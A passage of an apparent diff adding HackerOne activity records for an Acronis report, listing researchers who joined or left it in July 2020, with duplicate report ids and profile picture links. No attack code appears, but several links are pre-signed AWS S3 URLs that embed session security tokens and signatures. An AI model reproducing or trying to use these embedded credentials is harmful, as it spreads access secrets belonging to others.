VnHiyT1pdUGvbm2Ri8lcoQ7H%2BbeHuFYZkjkH1CR6lUBJfaEhXwMAzp8%2BdinRLj0MTXlU%2F0K1uC7FV4lfRXCvof5wj8m%2BdFNOY%2FthnIrNYj3jQHeMKtCjVez%2FPIpgLd7nMJtBfOKxN%2BA0nuGzrxka0k7Rm3FByYnZe1yMdUDoALpRS1KQuscu5o8jxv0Xa%2BWhozCbPKylMyYNMcIFQm9bmH0GD%2BF%2BIcbbwuskYTIRvRxUYWR%2BgcWc1hXxNXTpVJ1tDlstc4Fw%2BoWtBUiF4MO151WqX1lU6qkcZIB8bIW4LnN1AO%2F3KMQ0cNeVnUjADVXklvgxLHqHVI2%2FxX9F%2Bc7F4jWUlJwMYR4CtnV0lSDOcdsIRAoGm5Dlyu%2BGBHm0E9szzmRe9yTWOQiEbr%2BsaTRhFxzqWr8ue0nEqkZ6ZAmTO1RTlcHTMNZdZS1MPLZdjwthAiae%2FphhQstkxtEKrCfGhMvRS52DKOEvECIcuIeOq8cIkOxFyNXc9ghGN1FFQxpLJKFZmD4hbFCVRZtgrlDVeavSklNmOzLRY1WHQumcB2YvsmGv58jHnm%2FZe51zoKP9U7vpSOyrsjh3OwYQ%2BzuI6rItbcKFQZSLbL4MtcMyHxofT2sx2bl8dQq5UuHZC%2BP1%2Fu3Duhe8K10o7d70jxWXWKkX%2FXCauJlAw7I61pwY6sQG89C08plQG1A6gbdPziJfOcb%2FyZBW3%2BFOpsmNUBJJz3pouKGhoBruTYKmcGNvl6gFBH0kQi6IZr17jMNNb7ofmrjeAKtToIfjLsJlJLkkc7%2FqqGuQ3tX3bnAtE44qHhnRbqFGRQ6BzWEATYPS0L1E%2B6hcCCpz2xmeIirlvlGQbF7UW%2B7O5YFNrzbtwLsHw5D8Y8q%2B15ASZwGa7kp0s8X4M%2FlVGTpWEwtSD6XlV0stRL1o%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=ce70106128130d9e07364da7818758b049a6b52e464e3af67e06e6ab899dc4bf"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "acronis"
+        },
+        {
+            "id": 8697453,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::ExternalUserJoined",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2020-07-22T20:12:22.774Z",
+            "updated_at": "2020-07-22T20:12:22.774Z",
+            "additional_data": {
+                "report_permissions": null,
+                "duplicate_report_id": 933943
+            },
+            "actor": {
+                "username": "pomme",
+                "cleared": true,
+                "verified": true,
+                "url": "/pomme",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/305/707/0f7edc0bc93b94636c6a20aab5d0264df9e48654_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "acronis"
+        },
+        {
+            "id": 8703208,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::ExternalUserJoined",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2020-07-22T23:02:50.644Z",
+            "updated_at": "2020-07-22T23:02:50.644Z",
+            "additional_data": {
+                "report_permissions": null,
+                "duplicate_report_id": 935060
+            },
+            "actor": {
+                "username": "3_hack",
+                "cleared": false,
+                "verified": true,
+                "url": "/3_hack",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/Q8Z5FKWcKViBtJq8ZxZnRkYx/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "acronis"
+        },
+        {
+            "id": 8703215,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::ExternalUserJoined",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2020-07-22T23:03:43.934Z",
+            "updated_at": "2020-07-22T23:03:43.934Z",
+            "additional_data": {
+                "report_permissions": null,
+                "duplicate_report_id": 934644
+            },
+            "actor": {
+                "username": "emenalf",
+                "cleared": false,
+                "verified": false,
+                "url": "/emenalf",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/138/800/0c107b2e47283db02414a3f9ddde91c5ea01ed4c_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "acronis"
+        },
+        {
+            "id": 8703274,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::ExternalUserJoined",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2020-07-22T23:04:16.765Z",
+            "updated_at": "2020-07-22T23:04:16.765Z",
+            "additional_data": {
+                "report_permissions": null,
+                "duplicate_report_id": 934132
+            },
+            "actor": {
+                "username": "damian89",
+                "cleared": false,
+                "verified": false,
+                "url": "/damian89",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/074/229/2d63a2914887aa483eba2634f50d78b85870d569_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "acronis"
+        },
+        {
+            "id": 8704091,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::ExternalUserJoined",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2020-07-22T23:11:19.275Z",
+            "updated_at": "2020-07-22T23:11:19.275Z",
+            "additional_data": {
+                "report_permissions": null,
+                "duplicate_report_id": 934250
+            },
+            "actor": {
+                "username": "malcolmx",
+                "cleared": false,
+                "verified": true,
+                "url": "/malcolmx",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/043/962/0448fa629279eb47ceced2514304c8256b112624_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "acronis"
+        },
+        {
+            "id": 8704114,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::ExternalUserJoined",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2020-07-22T23:15:51.413Z",
+            "updated_at": "2020-07-22T23:15:51.413Z",
+            "additional_data": {
+                "report_permissions": null,
+                "duplicate_report_id": 935501
+            },
+            "actor": {
+                "username": "gevakun",
+                "cleared": false,
+                "verified": true,
+                "url": "/gevakun",
+                "profile_picture_urls": {
+                    "medium": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/n1zo2c4vcta0j5kkqhdjccoz9suu/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc?response-content-disposition=inline%3B%20filename%3D%22pexels-christiano-sinisterra-5197132.jpg%22%3B%20filename%2A%3DUTF-8%27%27pexels-christiano-sinisterra-5197132.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ2A32MPNM%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T070959Z&X-Amz-Expires=1177&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENL%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIBsEOMwacgmpJyapiLJobGs%2Bgcg9PNH4EriOGZo98SE4AiEAt90x4AmgjAq2rIIH1y%2FzssW%2FAhnA8Qye1rVHIwJcexEquwUImv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDBZa1%2FijtCdkdWImhiqPBWGkbtglINv7ypiNIiDYHjrdejYg0wtRl1gT6H0PEyTqGrM6uy7I1J9pNolUh5DffZcgFrPdxwVNxSgsTu4Dj40wjGn2o9qh0BWf4wO5PC%2FYnaaINUtHD0xSUrDCYd16Bo5kaybIxr7xuCItkaUqHeQAu8kGJCQziBsdAr7Ncgc7rh1cBX9EUoKfwpb6OQ0HEPiMYEaf15OVnHiyT1pdUGvbm2Ri8lcoQ7H%2BbeHuFYZkjkH1CR6lUBJfaEhXwMAzp8%2BdinRLj0MTXlU%2F0K1uC7FV4lfRXCvof5wj8m%2BdFNOY%2FthnIrNYj3jQHeMKtCjVez%2FPIpgLd7nMJtBfOKxN%2BA0nuGzrxka0k7Rm3FByYnZe1yMdUDoALpRS1KQuscu5o8jxv0Xa%2BWhozCbPKylMyYNMcIFQm9bmH0GD%2BF%2BIcbbwuskYTIRvRxUYWR%2BgcWc1hXxNXTpVJ1tDlstc4Fw%2BoWtBUiF4MO151WqX1lU6qkcZIB8bIW4LnN1AO%2F3KMQ0cNeVnUjADVXklvgxLHqHVI2%2FxX9F%2Bc7F4jWUlJwMYR4CtnV0lSDOcdsIRAoGm5Dlyu%2BGBHm0E9szzmRe9yTWOQiEbr%2BsaTRhFxzqWr8ue0nEqkZ6ZAmTO1RTlcHTMNZdZS1MPLZdjwthAiae%2FphhQstkxtEKrCfGhMvRS52DKOEvECIcuIeOq8cIkOxFyNXc9ghGN1FFQxpLJKFZmD4hbFCVRZtgrlDVeavSklNmOzLRY1WHQumcB2YvsmGv58jHnm%2FZe51zoKP9U7vpSOyrsjh3OwYQ%2BzuI6rItbcKFQZSLbL4MtcMyHxofT2sx2bl8dQq5UuHZC%2BP1%2Fu3Duhe8K10o7d70jxWXWKkX%2FXCauJlAw7I61pwY6sQG89C08plQG1A6gbdPziJfOcb%2FyZBW3%2BFOpsmNUBJJz3pouKGhoBruTYKmcGNvl6gFBH0kQi6IZr17jMNNb7ofmrjeAKtToIfjLsJlJLkkc7%2FqqGuQ3tX3bnAtE44qHhnRbqFGRQ6BzWEATYPS0L1E%2B6hcCCpz2xmeIirlvlGQbF7UW%2B7O5YFNrzbtwLsHw5D8Y8q%2B15ASZwGa7kp0s8X4M%2FlVGTpWEwtSD6XlV0stRL1o%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=a55d38a9fd9e58197b3bc13f250507373c9ff6c0f053af4ffb0c5cde9e2d6d14"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "acronis"
+        },
+        {
+            "id": 8704459,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::ExternalUserJoined",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2020-07-22T23:23:48.703Z",
+            "updated_at": "2020-07-22T23:23:48.703Z",
+            "additional_data": {
+                "report_permissions": null,
+                "duplicate_report_id": 933722
+            },
+            "actor": {
+                "username": "geekboy",
+                "cleared": false,
+                "verified": false,
+                "url": "/geekboy",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/003/547/b8825b0ae39f962fbe7813bf40d4efe19d018ee9_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "acronis"
+        },
+        {
+            "id": 8704475,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::ExternalUserJoined",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2020-07-22T23:25:30.750Z",
+            "updated_at": "2020-07-22T23:25:30.750Z",
+            "additional_data": {
+                "report_permissions": null,
+                "duplicate_report_id": 933735
+            },
+            "actor": {
+                "username": "mahmoud0x00",
+                "cleared": false,
+                "verified": true,
+                "url": "/mahmoud0x00",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/pm9f6nwspgy0xijnefbtk7iopgrv/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "acronis"
+        },
+        {
+            "id": 8704477,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::ExternalUserJoined",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2020-07-22T23:25:31.756Z",
+            "updated_at": "2020-07-22T23:25:31.756Z",
+            "additional_data": {
+                "report_permissions": null,
+                "duplicate_report_id": 933710
+            },
+            "actor": {
+                "username": "mahmoud0x00",
+                "cleared": false,
+                "verified": true,
+                "url": "/mahmoud0x00",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/pm9f6nwspgy0xijnefbtk7iopgrv/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "acronis"
+        },
+        {
+            "id": 8704479,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::ExternalUserJoined",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2020-07-22T23:25:32.780Z",
+            "updated_at": "2020-07-22T23:25:32.780Z",
+            "additional_data": {
+                "report_permissions": null,
+                "duplicate_report_id": 933707
+            },
+            "actor": {
+                "username": "mahmoud0x00",
+                "cleared": false,
+                "verified": true,
+                "url": "/mahmoud0x00",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/pm9f6nwspgy0xijnefbtk7iopgrv/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "acronis"
+        },
+        {
+            "id": 8704481,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::ExternalUserJoined",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2020-07-22T23:25:33.737Z",
+            "updated_at": "2020-07-22T23:25:33.737Z",
+            "additional_data": {
+                "report_permissions": null,
+                "duplicate_report_id": 933682
+            },
+            "actor": {
+                "username": "mahmoud0x00",
+                "cleared": false,
+                "verified": true,
+                "url": "/mahmoud0x00",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/pm9f6nwspgy0xijnefbtk7iopgrv/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "acronis"
+        },
+        {
+            "id": 8704483,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::ExternalUserJoined",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2020-07-22T23:25:34.732Z",
+            "updated_at": "2020-07-22T23:25:34.732Z",
+            "additional_data": {
+                "report_permissions": null,
+                "duplicate_report_id": 933639
+            },
+            "actor": {
+                "username": "mahmoud0x00",
+                "cleared": false,
+                "verified": true,
+                "url": "/mahmoud0x00",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/pm9f6nwspgy0xijnefbtk7iopgrv/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "acronis"
+        },
+        {
+            "id": 8704485,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::ExternalUserJoined",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2020-07-22T23:25:35.707Z",
+            "updated_at": "2020-07-22T23:25:35.707Z",
+            "additional_data": {
+                "report_permissions": null,
+                "duplicate_report_id": 933621
+            },
+            "actor": {
+                "username": "mahmoud0x00",
+                "cleared": false,
+                "verified": true,
+                "url": "/mahmoud0x00",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/pm9f6nwspgy0xijnefbtk7iopgrv/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "acronis"
+        },
+        {
+            "id": 8704489,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::ExternalUserJoined",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2020-07-22T23:25:36.728Z",
+            "updated_at": "2020-07-22T23:25:36.728Z",
+            "additional_data": {
+                "report_permissions": null,
+                "duplicate_report_id": 933608
+            },
+            "actor": {
+                "username": "mahmoud0x00",
+                "cleared": false,
+                "verified": true,
+                "url": "/mahmoud0x00",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/pm9f6nwspgy0xijnefbtk7iopgrv/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "acronis"
+        },
+        {
+            "id": 8704491,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::ExternalUserJoined",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2020-07-22T23:25:37.732Z",
+            "updated_at": "2020-07-22T23:25:37.732Z",
+            "additional_data": {
+                "report_permissions": null,
+                "duplicate_report_id": 933579
+            },
+            "actor": {
+                "username": "mahmoud0x00",
+                "cleared": false,
+                "verified": true,
+                "url": "/mahmoud0x00",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/pm9f6nwspgy0xijnefbtk7iopgrv/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "acronis"
+        },
+        {
+            "id": 8704495,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::ExternalUserJoined",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2020-07-22T23:25:39.289Z",
+            "updated_at": "2020-07-22T23:25:39.289Z",
+            "additional_data": {
+                "report_permissions": null,
+                "duplicate_report_id": 933572
+            },
+            "actor": {
+                "username": "mahmoud0x00",
+                "cleared": false,
+                "verified": true,
+                "url": "/mahmoud0x00",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/pm9f6nwspgy0xijnefbtk7iopgrv/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "acronis"
+        },
+        {
+            "id": 8704522,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::ExternalUserRemoved",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2020-07-22T23:29:49.653Z",
+            "updated_at": "2020-07-22T23:29:49.653Z",
+            "actor": {
+                "username": "malcolmx",
+                "cleared": false,
+                "verified": true,
+                "url": "/malcolmx",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/043/962/0448fa629279eb47ceced2514304c8256b112624_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "removed_user": {
+                "url": "/malcolmx",
+                "username": "malcolmx"
+            },
+            "genius_execution_id": null,
+            "team_handle": "acronis"
+        },
+        {
+            "id": 8704705,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::ExternalUserRemoved",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2020-07-22T23:38:08.193Z",
+            "updated_at": "2020-07-22T23:38:08.193Z",
+            "actor": {
+                "username": "mahmoud0x00",
+                "cleared": false,
+                "verified": true,
+                "url": "/mahmoud0x00",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/pm9f6nwspgy0xijnefbtk7iopgrv/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "removed_user": {
+                "url": "/mahmoud0x00",
+                "username": "mahmoud0x00"
+            },
+            "genius_execution_id": null,
+            "team_handle": "acronis"
+        },
+        {
+            "id": 8713922,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::ExternalUserJoined",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2020-07-23T07:12:47.333Z",
+            "updated_at": "2020-07-23T07:12:47.333Z",
+            "additional_data": {
+                "report_permissions": null,
+                "duplicate_report_id": 936900
+            },
+            "actor": {
+                "username": "0xd0ff9",
+                "cleared": false,
+                "verified": false,
+                "url": "/0xd0ff9",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/96dkkhjlzp1lhqagan2xilesyjlz/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "acronis"
+        },
+        {
+            "id": 8713931,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::ExternalUserJoined",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2020-07-23T07:14:13.531Z",
+            "updated_at": "2020-07-23T07:14:13.531Z",
+            "additional_data": {
+                "report_permissions": null,
+                "duplicate_report_id": 936124
+            },
+            "actor": {
+                "username": "itsbing0o",
+                "cleared": false,
+                "verified": false,
+                "url": "/itsbing0o",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/dp9SZrAZqivbBXVxeW2Br65n/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "acronis"
+        },
+        {
+            "id": 8714359,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::ExternalUserJoined",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2020-07-23T08:00:38.645Z",
+            "updated_at": "2020-07-23T08:00:38.645Z",
+            "additional_data": {
+                "report_permissions": null,
+                "duplicate_report_id": 937552
+            },
+            "actor": {
+                "username": "kazan71p",
+                "cleared": true,
+                "verified": true,
+                "url": "/kazan71p",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/fkuufndebpimyah20hqky9hkaeo1/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "acronis"
+        },
+        {
+            "id": 8714595,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::ExternalUserRemoved",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2020-07-23T08:23:46.492Z",
+            "updated_at": "2020-07-23T08:23:46.492Z",
+            "actor": {
+                "username": "pomme",
+                "cleared": true,
+                "verified": true,
+                "url": "/pomme",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/305/707/0f7edc0bc93b94636c6a20aab5d0264df9e48654_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "removed_user": {
+                "url": "/pomme",
+                "username": "pomme"
+            },
+            "genius_execution_id": null,
+            "team_handle": "acronis"
+        },
+        {
+            "id": 8714628,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::ExternalUserJoined",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2020-07-23T08:25:58.294Z",
+            "updated_at": "2020-07-23T08:25:58.294Z",
+            "additional_data": {
+                "report_permissions": null,
+                "duplicate_report_id": 937560
+            },
+            "actor": {
+                "username": "shaikhyaser",
+                "cleared": true,
+                "verified": true,
+                "url": "/shaikhyaser",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/mv5n98vt4h8hgxg265hcpmk2goer/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "acronis"
+        },
+        {
+            "id": 8717026,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::ExternalUserJoined",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2020-07-23T09:52:30.701Z",
+            "updated_at": "2020-07-23T09:52:30.701Z",
+            "additional_data": {
+                "report_permissions": null,
+                "duplicate_report_id": 937848
+            },
+            "actor": {
+                "username": "k1ra_",
+                "cleared": true,
+                "verified": true,
+                "url": "/k1ra_",
+                "profile_picture_urls": {
+                    "medium": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/hyhq870o1di1jqa6czgkcxg06v6c/b128ffa1658e6eef6c9a7f34a95a0c1abf13970d3d7fc662a5e0772faeabcd87?response-content-disposition=inline%3B%20filename%3D%22Ef6TX6QVoAAQxC5.jfif%22%3B%20filename%2A%3DUTF-8%27%27Ef6TX6QVoAAQxC5.jfif&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ2A32MPNM%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T070959Z&X-Amz-Expires=1177&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENL%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIBsEOMwacgmpJyapiLJobGs%2Bgcg9PNH4EriOGZo98SE4AiEAt90x4AmgjAq2rIIH1y%2FzssW%2FAhnA8Qye1rVHIwJcexEquwUImv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDBZa1%2FijtCdkdWImhiqPBWGkbtglINv7ypiNIiDYHjrdejYg0wtRl1gT6H0PEyTqGrM6uy7I1J9pNolUh5DffZcgFrPdxwVNxSgsTu4Dj40wjGn2o9qh0BWf4wO5PC%2FYnaaINUtHD0xSUrDCYd16Bo5kaybIxr7xuCItkaUqHeQAu8kGJCQziBsdAr7Ncgc7rh1cBX9EUoKfwpb6OQ0HEPiMYEaf15OVnHiyT1pdUGvbm2Ri8lcoQ7H%2BbeHuFYZkjkH1CR6lUBJfaEhXwMAzp8%2BdinRLj0MTXlU%2F0K1uC7FV4lfRXCvof5wj8m%2BdFNOY%2FthnIrNYj3jQHeMKtCjVez%2FPIpgLd7nMJtBfOKxN%2BA0nuGzrxka0k7Rm3FByYnZe1yMdUDoALpRS1KQuscu5o8jxv0Xa%2BWhozCbPKylMyYNMcIFQm9bmH0GD%2BF%2BIcbbwuskYTIRvRxUYWR%2BgcWc1hXxNXTpVJ1tDlstc4Fw%2BoWtBUiF4MO151WqX1lU6qkcZIB8bIW4LnN1AO%2F3KMQ0cNeVnUjADVXklvgxLHqHVI2%2FxX9F%2Bc7F4jWUlJwMYR4CtnV0lSDOcdsIRAoGm5Dlyu%2BGBHm0E9szzmRe9yTWOQiEbr%2BsaTRhFxzqWr8ue0nEqkZ6ZAmTO1RTlcHTMNZdZS1MPLZdjwthAiae%2FphhQstkxtEKrCfGhMvRS52DKOEvECIcuIeOq8cIkOxFyNXc9ghGN1FFQxpLJKFZmD4hbFCVRZtgrlDVeavSklNmOzLRY1WHQumcB2YvsmGv58jHnm%2FZe51zoKP9U7vpSOyrsjh3OwYQ%2BzuI6rItbcKFQZSLbL4MtcMyHxofT2sx2bl8dQq5UuHZC%2BP1%2Fu3Duhe8K10o7d70jxWXWKkX%2FXCauJlAw7I61pwY6sQG89C08plQG1A6gbdPziJfOcb%2FyZBW3%2BFOpsmNUBJJz3pouKGhoBruTYKmcGNvl6gFBH0kQi6IZr17jMNNb7ofmrjeAKtToIfjLsJlJLkkc7%2FqqGuQ3tX3bnAtE44qHhnRbqFGRQ6BzWEATYPS0L1E%2B6hcCCpz2xmeIirlvlGQbF7UW%2B7O5YFNrzbtwLsHw5D8Y8q%2B15ASZwGa7kp0s8X4M%2FlVGTpWEwtSD6XlV0stRL1o%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=50aea6ce541e920eb01b488ec228f72271eb2645613631bdc4645b9d61c99d65"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "acronis"
+        },
+        {
+            "id": 8717622,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::ExternalUserJoined",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2020-07-23T10:35:27.211Z",
+            "updated_at": "2020-07-23T10:35:27.211Z",
+            "additional_data": {
+                "report_permissions": null,
+                "duplicate_report_id": 938094
+            },
+            "actor": {
+                "username": "ducnt_",
+                "cleared": false,
+                "verified": false,
+                "url": "/ducnt_",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/6ee5MQXtSjZcRf1dEPRoFEdP/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "acronis"
+        },
+        {
+            "id": 8717807,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::ExternalUserRemoved",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2020-07-23T10:45:06.410Z",
+            "updated_at": "2020-07-23T10:45:06.410Z",
+            "actor": {
+                "username": "kazan71p",
+                "cleared": true,
+                "verified": true,
+                "url": "/kazan71p",
+                "profile_picture_urls": {
